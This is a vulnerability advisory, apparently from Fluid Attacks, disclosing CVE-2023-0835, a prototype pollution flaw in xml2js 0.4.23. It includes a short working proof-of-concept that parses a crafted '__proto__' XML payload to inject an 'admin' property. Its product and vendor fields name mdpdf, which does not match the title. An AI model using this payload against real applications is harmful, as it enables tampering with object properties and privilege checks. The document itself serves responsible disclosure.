---
slug: advisories/myers/
title: xml2js 0.4.23          -         Prototype Pollution
authors: Carlos Bello
writer: cbello
codename: myers
product: xml2js 0.4.23  -  Prototype Pollution
date: 2023-02-20 12:00 COT
cveid: CVE-2023-0835
severity: 7.3
description: xml2js 0.4.23          -         Prototype Pollution
keywords: Fluid Attacks, Security, Vulnerabilities, NPM, Prototype Pollution
banner: advisories-bg
advise: yes
template: maskedAdvisory
encrypted: yes
---

## Summary

|                       |                                                                    |
| --------------------- | -------------------------------------------------------------------|
| **Name**              | xml2js 0.4.23 - Prototype Pollution                                |
| **Code name**         | [Myers](https://en.wikipedia.org/wiki/Bryant_Myers)                |
| **Product**           | mdpdf                                                              |
| **Affected versions** | Version 0.4.23                                                     |
| **State**             | Public                                                             |
| **Release date**      | 2023-02-20                                                         |

## Vulnerability

|                       |                                                                                                                             |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------|
| **Kind**              | Prototype Pollution                                                                                                         |
| **Rule**              | [390. Prototype Pollution](https://docs.fluidattacks.com/criteria/vulnerabilities/390)                                      |
| **Remote**            | Yes                                                                                                                         |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L                                                                                |
| **CVSSv3 Base Score** | 7.3                                                                                                                         |
| **Exploit available** | Yes                                                                                                                         |
| **CVE ID(s)**         | [CVE-2023-0835](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0835)                                               |

## Description

xml2js version 0.4.23 allows an external attacker to edit or add new
properties to an object. This is possible because the application does
not properly validate incoming JSON keys, thus allowing the `__proto__`
property to be edited.

## Vulnerability

Prototype pollution is a vulnerability that affects JS. It occurs when a
third party manages to modify the `__proto__` of an object. JavaScript
first checks if such a method/attribute exists in the object. If so, then
it calls it. If not, it looks in the object's prototype. If the method/attribute
is also not in the object's prototype, then the property is said to be undefined.

Therefore, if an attacker succeeds in injecting the `__proto__` property into an
object, he will succeed in injecting or editing its properties.

## Exploitation

### Exploit.md

```js
var parseString = require('xml2js').parseString;

let result = {}

console.log(result.admin);

var xml = "<__proto__><admin>1</admin></__proto__>"
parseString(xml, function (err, result) {
    console.log(result.admin);
});

console.log(result)
```

## Evidence of exploitation

![Explotation-xml2js](https://user-images.githubusercontent.com/51862990/218889830-a9ad98f3-7757-4bbc-9fa8-e711280d34f8.png)

## Our security policy

We have reserved the ID CVE-2023-0835 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: xml2js 0.4.23

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://www.npmjs.com/package/mdpdf/>

## Timeline

<time-lapse
  discovered="2023-02-14"
  contacted="2023-02-14"
  replied="2023-02-14"
  confirmed=""
  patched=""
  disclosure="">
</time-lapse>
